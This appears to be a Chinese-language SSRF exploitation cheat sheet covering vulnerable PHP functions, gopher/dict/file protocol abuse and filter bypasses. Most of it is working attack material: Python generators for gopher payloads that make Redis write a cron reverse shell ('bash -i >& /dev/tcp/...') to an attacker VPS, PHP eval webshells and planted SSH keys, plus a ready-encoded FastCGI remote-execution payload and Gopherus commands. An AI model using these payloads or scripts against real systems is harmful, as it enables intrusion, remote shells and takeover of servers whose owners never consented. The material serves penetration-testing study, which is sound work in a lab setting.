# SSRF

## 漏洞详情

SSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。

## 危害

1. 内外网的端口和服务扫描
2. 攻击运行在内网或者本地的应用程序.
3. 对内网web应用进行指纹识别，识别企业内部的资产信息
4. 攻击内网的web应用，主要是使用GET参数就可以实现的攻击
5. 向内部任意主机的任意端口发送精心构造的pPayload
6. 利用file协议读取本地敏感文件



## 容易出现SSRF的地方

1. 社交分享功能：获取超链接的标题等内容进行显示
2. 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览
3. 在线翻译：给网址翻译对应网页的内容
4. 图片加载/下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片
5. 图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验
6. 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试
7. 网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作
8. 数据库内置功能：数据库的比如mongodb的copyDatabase函数
9. 邮件系统：比如接收邮件服务器地址
10. 编码处理、属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等
11. 未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字有：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……
12. 从远程服务器请求资源

## 基础

### 相关函数和类

```php
file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。
readfile()：输出一个文件的内容。
fsockopen()：打开一个网络连接或者一个Unix 套接字连接。
curlexec()：初始化一个新的会话，返回一个cURL句柄，供curlsetopt()，curlexec()和curlclose() 函数使用。
fopen()：打开一个文件文件或者 URL。
```

#### file_get_contents

测试代码

```php
<?php
$url = $_GET['url'];;
echo file_get_contents($url);
?>
```

filegetcontents() 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，可以构造:?url=../../../etc/passwd读取服务器上的任意文件

也可以进行远程访问: ?url=http://www.baiduc.om

readfile()函数与filegetcontents()函数相似。

#### fsockopen

`fsockopen($hostname,$port,$errno,$errstr,$timeout)`用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。

该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。 fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。

测试代码:

```php
<?php
$host=$_GET['url'];
$fp = fsockopen($host, 80, $errno, $errstr, 30);
if (!$fp) {
    echo "$errstr ($errno)<br />\n";
} else {
    $out = "GET / HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);
    while (!feof($fp)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}
?>
```

构造`ssrf.php?url=www.baidu.com`即可成功触发ssrf并返回百度主页：

#### Curl_exec

curl_init(url)函数初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。

```php
// ssrf.php
<?php 
if (isset($_GET['url'])){
    $link = $_GET['url'];
    $curlobj = curl_init(); // 创建新的 cURL 资源
    curl_setopt($curlobj, CURLOPT_POST, 0);
    curl_setopt($curlobj,CURLOPT_URL,$link);
    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // 设置 URL 和相应的选项
    $result=curl_exec($curlobj); // 抓取 URL 并把它传递给浏览器
    curl_close($curlobj); // 关闭 cURL 资源，并且释放系统资源

    // $filename = './curled/'.rand().'.txt';
    // file_put_contents($filename, $result); 
    echo $result;
}
?>
```

构造`ssrf.php?url=www.baidu.com`即可成功触发ssrf并返回百度主页：

#### SoapClient

SOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。

SoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的`__call`方法，那么`__call`便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：

```php
public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
```

- 第一个参数是用来指明是否是wsdl模式。
- 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。

知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数为一个包含location和uri的数组，location选项的值设置为target_url：

```php
// ssrf.php
<?php
$a = new SoapClient(null,array('uri'=>'http://47.xxx.xxx.72:2333', 'location'=>'http://47.xxx.xxx.72:2333/aaa'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

47.xxx.xxx.72监听2333端口，访问ssrf.php，即可在47.xxx.xxx.72上得到访问的数据：

### 相关协议

```php
file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容
dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等
gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell
http/s协议：探测内网主机存活
```

#### File协议

读取本地文件使用的

```php
?url=file:///C:/windows/win.ini
```

#### HTTP协议

探测内网存活的主机(但是很多不开http协议，没多大用)

抓一下包，放到bp，进行爆破

#### Dict协议

结合端口探测内网服务

探测mysql

```php
?url=dict://192.168.0.130:3306/info
```

探测redis

```php
?url=dict://192.168.1.111:6379/info
```

#### Gopher协议

Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处

> gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议

**格式**

```php
gopher://<host>:<port>/<gopher-path>_后接tcp数据流

# 注意不要忘记后面那个下划线"_"，下划线"_"后面才开始接TCP数据流，如果不加这个"_"，那么服务端收到的消息将不是完整的，该字符可随意写。
```

gopher的默认端口时70

如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&也需要进行URL编码

**如何利用Gopher发送HTTP请求**

1. 抓取或构造HTTP数据包
2. URL编码、将回车换行符%0a替换为%0d%0a
3. 发送gopher协议格式的请求

**Gopher发送Get请求**

```php
1、问号（？）需要转码为URL编码，也就是%3f
2、回车换行需要变为%0d%0a，如果直接用工具转，可能只会有%0a
3、在HTTP包的最后要加%0a%0a，代表消息结束（具体可研究HTTP包结束）
```

```python
import re
import urllib.parse

data = '''
GET /try.php?a=Wan&b=Zifeng HTTP/1.1
Host: 192.168.0.130:8201
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
'''
data = urllib.parse.quote(data)
strinfo = re.compile('%0A', re.I)
new = strinfo.sub('%0D%0A', data)
new = 'gopher://192.168.0.130:8201/_' + new + '%0D%0A'
new = urllib.parse.quote(new)
with open('Result.txt', 'w') as f:
    f.write(new)
with open('Result.txt', 'r') as f:
    for line in f.readlines():
        print(line.strip())
```

因为BP是抓取浏览器URLEncode编码后的数据，所以我们得对整个gopher协议进行二次编码

这样到达服务器一次解码得到的就是

>gopher://192.168.0.130:8201/_GET%20/try.php%3Fa%3DWan%26b%3DZifeng%20HTTP/1.1%0D%0AHost%3A%20192.168.0.130%3A8201%0D%0ACache-Control%3A%20max-age%3D0%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20×64%29%20AppleWebKit/537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome/92.0.4515.159%20Safari/537.36%0D%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2Cimage/avif%2Cimage/webp%2Cimage/apng%2C%2A/%2A%3Bq%3D0.8%2Capplication/signed-exchange%3Bv%3Db3%3Bq%3D0.9%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.9%0D%0AConnection%3A%20close%0D%0A

这样就是可以正常解析的URL（Gopher发送的TCP数据流要求是URLEncode后的，毕竟是伪协议嘛），丢给Curl函数执行完事

**测试代码:**

```php
// echo.php
<?php
echo "Hello ".$_GET["whoami"]."\n"
?>
```

接下来我们构造payload。一个典型的GET型的HTTP包类似如下：

```php
GET /echo.php?whoami=Bunny HTTP/1.1

Host: 47.xxx.xxx.72
```

然后利用以下脚本进行一步生成符合Gopher协议格式的payload：

```python
import urllib.parse
payload =\
"""GET /echo.php?whoami=Bunny HTTP/1.1
Host: 47.xxx.xxx.72
"""  
# 注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://47.xxx.xxx.72:80/'+'_'+new
print(result)
```



**Gopher发送POST请求**

测试代码:

```php
// echo.php
<?php
echo "Hello ".$_POST["whoami"]."\n"
?>
```

接下来我们构造payload。一个典型的POST型的HTTP包类似如下：

```php
POST /echo.php HTTP/1.1
Host: 47.xxx.xxx.72
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

whoami=Bunny
```

**注意：上面那四个HTTP头是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。并且，特别要注意Content-Length应为字符串“whoami=Bunny”的长度。**

最后用脚本我们将上面的POST数据包进行URL编码并改为gopher协议

```python
import urllib.parse
payload =\
"""POST /echo.php HTTP/1.1
Host: 47.xxx.xxx.72
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

whoami=Bunny
"""  
# 注意后面一定要有回车，回车结尾表示http请求结束
tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A','%0D%0A')
result = 'gopher://47.xxx.xxx.72:80/'+'_'+new
print(result)
```

然后执行：

```php
curl gopher://47.xxx.xxx.72:80/_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A
```

## 攻击内网应用

### Redis未授权攻击

概念:

```php
Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。
    
简单说，漏洞的产生条件有以下两点：

redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。
没有设置密码认证（默认为空），可以免密码远程登录redis服务。
```

#### 定时任务

**注意：这个只能在Centos上使用，别的不行，好像是由于权限的问题。**

redis命令

```sh
set 1 '\n\n*/1 * * * * bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1\n\n'
config set dir /var/spool/cron/
config set dbfilename root
save

// 47.xxx.xxx.72为攻击者vps的IP
```

然后编写脚本，将其转化为Gopher协议的格式：

```python
import urllib
protocol="gopher://"
ip="192.168.52.131"
port="6379"
reverse_ip="47.xxx.xxx.72"
reverse_port="2333"
cron="\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n"%(reverse_ip,reverse_port)
filename="root"
path="/var/spool/cron"
passwd=""
cmd=["flushall",
   "set 1 {}".format(cron.replace(" ","${IFS}")),
   "config set dir {}".format(path),
   "config set dbfilename {}".format(filename),
   "save"
   ]
if passwd:
  cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
  CRLF="\r\n"
  redis_arr = arr.split(" ")
  cmd=""
  cmd+="*"+str(len(redis_arr))
  for x in redis_arr:
    cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
  cmd+=CRLF
  return cmd

if __name__=="__main__":
  for x in cmd:
    payload += urllib.quote(redis_format(x))
  print payload
```

生成的payload同样进行url二次编码，然后利用Ubuntu服务器上的SSRF打过去，即可在目标主机192.168.52.131上写入计划任务，等到时间后，攻击者vps上就会获得目标主机的shell：

#### 绝对路径写shell

构造redis命令

```php
flushall
set 1 '<?php eval($_GET["cmd"]);?>'
config set dir /var/www/html
config set dbfilename shell.php
save
```

使用脚本打

```php
import urllib
protocol="gopher://"
ip="192.168.163.128"
port="6379"
shell="\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
filename="shell.php"
path="/var/www/html"
passwd=""
cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print payload
```

第二种:

```php
flushall
set 1 '<?php eval($_POST["whoami"]);?>'
config set dir /var/www/html
config set dbfilename shell.php
save
```

然后写一个脚本，将其转化为Gopher协议的格式

```python
import urllib
protocol="gopher://"
ip="192.168.52.131"
port="6379"
shell="\n\n<?php eval($_POST[\"whoami\"]);?>\n\n"
filename="shell.php"
path="/var/www/html"
passwd=""
cmd=["flushall",
   "set 1 {}".format(shell.replace(" ","${IFS}")),
   "config set dir {}".format(path),
   "config set dbfilename {}".format(filename),
   "save"
   ]
if passwd:
  cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
  CRLF="\r\n"
  redis_arr = arr.split(" ")
  cmd=""
  cmd+="*"+str(len(redis_arr))
  for x in redis_arr:
    cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
  cmd+=CRLF
  return cmd

if __name__=="__main__":
  for x in cmd:
    payload += urllib.quote(redis_format(x))
  print payload
```

将生成的payload要进行url二次编码（因为我们发送payload用的是GET方法）

#### 写SSH公钥

生成ssh公钥和私钥

```php
ssh-keygen -t rsa
```

Redis命令

```php
flushall
set 1 '公钥'
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
```

python脚本

```python
import urllib.parse

protocol = "gopher://"
ip = "192.168.0.141"
port = "6379"
ssh_pub = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8YIKqm8JZRdoi2FCY97+fNp+lTCEwoPPoBGOKLLWYeeKsm3gRNy7kmHx1IHhsmyIknEcbQCciBx41Ln+1SIbEqYVFksHNxk8xGiaxjsUOYATqQ1Lkq/ZMxKAzpq08uGp17URbJmv3JtuKEkHPdEHDqvBQJLUVJCCvAm86Yer8y663BFxRv5AXwSkCYquLP7XvG6yyYATdoRPJCdqjTtsGIlpJOH4gMfEhZOxKsLzwZJIWYose2BEA1REM7Nfxx2Oqva/hSErf5RqXgXXSWC3/jBlzP2xof1a4CDRL9LoKLLTwUFQKWSMfnjMKYH3+uZIg4MyUAdWWwubEhpS6lpJd wzf@wzf-virtual-machine"
filename = "authorized_keys"
path = "/root/.ssh/"
passwd = ""
cmd = ["flushall", "set 1 {}".format(ssh_pub.replace(" ", "${IFS}")), "config set dir {}".format(path),
       "config set dbfilename {}".format(filename), "save"]
if passwd:    cmd.insert(0, "AUTH {}".format(passwd))
payload = protocol + ip + ":" + port + "/_"


def redis_format(arr):
    CRLF = "\r\n"
    redis_arr = arr.split(" ")
    cmd = ""
    cmd += "*" + str(len(redis_arr))
    for x in redis_arr:
        cmd += CRLF + "$" + str(len((x.replace("${IFS}", " ")))) + CRLF + x.replace("${IFS}", " ")
        cmd += CRLF
    return cmd
if __name__ == '__main__':
    for x in cmd:
        payload += urllib.parse.quote(redis_format(x))
    payload = urllib.parse.quote(payload)
    with open('Result.txt', 'w') as f:
        f.write(payload)
    with open("Result.txt", "r") as f:
        for line in f.readlines():
            print(line.strip())
```

脚本二

```python
import urllib
protocol="gopher://"
ip="192.168.52.131"
port="6379"
ssh_pub="\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\n\n"
filename="authorized_keys"
path="/root/.ssh/"
passwd=""
cmd=["flushall",
   "set 1 {}".format(ssh_pub.replace(" ","${IFS}")),
   "config set dir {}".format(path),
   "config set dbfilename {}".format(filename),
   "save"
   ]
if passwd:
  cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
  CRLF="\r\n"
  redis_arr = arr.split(" ")
  cmd=""
  cmd+="*"+str(len(redis_arr))
  for x in redis_arr:
    cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
  cmd+=CRLF
  return cmd

if __name__=="__main__":
  for x in cmd:
    payload += urllib.quote(redis_format(x))
  print payload
```

生成的payload同样进行url二次编码

```python
ssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524568%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E%2F45IEs%2F9a6AWfXb6iwzo%252BD62y8MOmt%252Bsct27ZxGOcRR95FT6zrfFxqt2h56oLwml%2FTrxy5sExSQ%2FcvvLwUTWb3ntJYyh2eGkQnOf2d%252Bax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH%2F4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd%2FbWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ%2FNnHKyWtI%2FOzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe%252BXqQnjxtk4giopiFfRu8winE9scqlIA5Iu%2Fd3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg%2FOOhoA3iKNhJ%2FJT31TU9E24dGh2Ei8K%252BPpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl%252BSOsVHpNqwFcrgsq%2FWR5BGqnu54vTTdJh0pSrl%252BtniHEnWWU%253D%2520root%2540whoami%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
```



## SSRF拟真靶场

[SSRF拟真靶场]: SSRF拟真靶场.md

## 绕过

### @绕过

url完整格式:

```php
[协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]
```

```php
<a href=”http://baidu.com@1.1.1.1″”>http://baidu.com@1.1.1.1 
等同于
http://1.1.1.1
```

### 进制绕过

一般过滤IP的正则表达式:

```php
$str = '';
$isMatched = preg_match_all('/((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d{1,2})){3}/', $str, $matches);
var_dump($isMatched, $matches);
```

可以使用各种进制绕过：以`192.168.0.1`为例 网站: http://mo.ab126.com/system/2859.html

十六进制 = C0A80001

十进制 = 3232235521

二进制 = 11000000101010000000000000000001

```python
<?php

$ip = '127.0.0.1';

$ip = explode('.',$ip);

$r = ($ip[0] << 24) | ($ip[1] << 16) | ($ip[2] << 8) | $ip[3] ;

if($r < 0) {

    $r += 4294967296;

}

echo "十进制:";     // 2130706433

echo $r;

echo "八进制:";     // 0177.0.0.1

echo decoct($r);

echo "十六进制:";   // 0x7f.0.0.1

echo dechex($r);

?>
```



### 302重定向绕过&短网址绕过

一般来说，PHP里的重定向长这样

```php
<?php
    function redirect($url){    
    	header("Location: $url");    
    	exit();
	}
```

如果`192.168.0.1.xip.io`都被过滤了，但是重定向没有被控制；你可以去[TINYURL](https://tinyurl.com/app/myurls)生成一个短URL

访问短URL的流程就是

网站地址：https://4m.cn/

```
https://tinyurl.com/4czmrv9d`->302跳转->成功访问`192.168.0.1
```

这样就成功绕过了检查

### 冷门协议绕过

如果是php，可以试试php所有的伪协议以及冷门的非HTTP协议	

```php
php://系列zip:// & bzip2:// & zlib://系列data://phar://file:///dict://sftp://ftp://tftp://ldap://gopher://
```

### 特殊用法绕过

```php
下面这俩可以试试绕过127.0.0.1:80，不一定有效

http://[::]:80/ http://0000::1:80/http://0/
```

中文句号也可以试试

```
192。168。0。1
```

### xip.io和xip.name

这俩东西叫泛域名解析，这篇[文章](https://cloud.tencent.com/developer/article/1825757)很详细地描述了泛域名的配置；想要具体了解的可以去看看

一旦配置了这个服务，会出现下面这样的情况

```php
http://10.0.0.1.xip.io = 10.0.0.1

www.10.0.0.1.xip.io= 10.0.0.1

http://mysite.10.0.0.1.xip.io = 10.0.0.1

foo.http://bar.10.0.0.1.xip.io = 10.0.0.1
10.0.0.1.xip.name resolves to 10.0.0.1

www.10.0.0.2.xip.name resolves to 10.0.0.2

foo.10.0.0.3.xip.name resolves to 10.0.0.3

bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4
```

### 过滤localhost和127.0.0.1

各种指向127.0.0.1的地址

```php
http://localhost/         # localhost就是代指127.0.0.1
http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1
http://0.0.0.0/       # 0.0.0.0这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址
http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行
http://[::]:80/           # 在liunx下可用，window测试了下不行
http://127。0。0。1/       # 用中文句号绕过
http://①②⑦.⓪.⓪.①
http://127.1/
http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1
```

### 利用不存在的协议头绕过指定的协议头

file_get_contents()函数的一个特性，即当PHP的 `file_get_contents()` 函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）

测试代码:

```php
<?php
highlight_file(__FILE__);
if(!preg_match('/^https/is',$_GET['url'])){
    die("no hack");
}
echo file_get_contents($_GET['url']);
?>
```

上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：

```php
httpsssss://
```

此时 `file_get_contents()` 函数遇到了不认识的伪协议头“httpsssss://”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：

```sh
ssrf.php?url=httpsssss://../../../../../../etc/passwd

ssrf.php?url=httpsssss://abc../../../../../../etc/passwd
```

### 利用URL的解析问题

该思路来自Orange Tsai成员在2017 BlackHat 美国黑客大会上做的题为《A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages》的分享。主要是利用readfile和parseurl函数的解析差异以及curl和parseurl解析差异来进行绕过。

**（1）利用readfile和parse_url函数的解析差异绕过指定的端口**

测试代码:

```php
// ssrf.php
<?php
$url = 'http://'. $_GET[url];
$parsed = parse_url($url);
if( $parsed[port] == 80 ){  // 这里限制了我们传过去的url只能是80端口的
  readfile($url);
} else {
  die('Hacker!');
}
?>
```

用python在当前目录下起一个端口为11211的WEB服务：

```php
python -m SimpleHTTPServer 11211
```

上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过：

```php
ssrf.php?url=127.0.0.1:11211:80/flag.txt
```

**（2）利用curl和parse_url的解析差异绕指定的host**

测试代码：

```python
<?php
highlight_file(__FILE__);
function check_inner_ip($url)
{
    $match_result=preg_match('/^(http|https)?:\/\/.*(\/)?.*$/',$url);
    if (!$match_result)
    {
        die('url fomat error');
    }
    try
    {
        $url_parse=parse_url($url);
    }
    catch(Exception $e)
    {
        die('url fomat error');
        return false;
    }
    $hostname=$url_parse['host'];
    $ip=gethostbyname($hostname);
    $int_ip=ip2long($ip);
    return ip2long('127.0.0.0')>>24 == $int_ip>>24 || ip2long('10.0.0.0')>>24 == $int_ip>>24 || ip2long('172.16.0.0')>>20 == $int_ip>>20 || ip2long('192.168.0.0')>>16 == $int_ip>>16;// 检查是否是内网ip
}
function safe_request_url($url)
{
    if (check_inner_ip($url))
    {
        echo $url.' is inner ip';
    }
    else
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        $output = curl_exec($ch);
        $result_info = curl_getinfo($ch);
        if ($result_info['redirect_url'])
        {
            safe_request_url($result_info['redirect_url']);
        }
        curl_close($ch);
        var_dump($output);
    }
}
$url = $_GET['url'];
if(!empty($url)){
    safe_request_url($url);
}
?>
```

上述代码中可以看到 `check_inner_ip` 函数通过 `url_parse()` 函数检测是否为内网IP，如果不是内网 IP ，则通过 `curl()` 请求 url 并返回结果，我们可以利用curl和parse_url解析的差异不同来绕过这里的限制，让 `parse_url()` 处理外部网站网址，最后 `curl()` 请求内网网址。paylaod如下：

```php
ssrf.php?url=http://@127.0.0.1:80@www.baidu.com/flag.php
```

不过这个方法在Curl较新的版本里被修掉了，所以我们还可以使用另一种方法，即 `0.0.0.0` 。 `0.0.0.0` 这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址，使用如下即可绕过：

```php
ssrf.php?url=http://0.0.0.0/flag.php
```

但是这只适用于Linux系统上，Windows系统的不行。



## gopherus工具使用

### 攻击Mysql

```php
python2 gopherus.py --exploit mysql
root用户名
select "<?php eval($_POST[1]); ?>"
    
需要对下划线后面的paylaod进行二次url编码
```

### 攻击redis

```php
python2 gopherus.py --exploit redis
Webshell类型：php
<?php eval($_POST[1]); ?>
```

记得二次url编码

### 攻击fastcgi

```php
python gopherus.py --exploit fastcgi
/var/www/html/index.php    # 这里输入的是一个已知存在的php文件
id    # 输入一个你要执行的命令
```

然后还是将得到的payload进行二次url编码，将最终得到的payload放到?url=后面打过去过去：

```
ssrf.php?url=gopher%3A//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527id%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```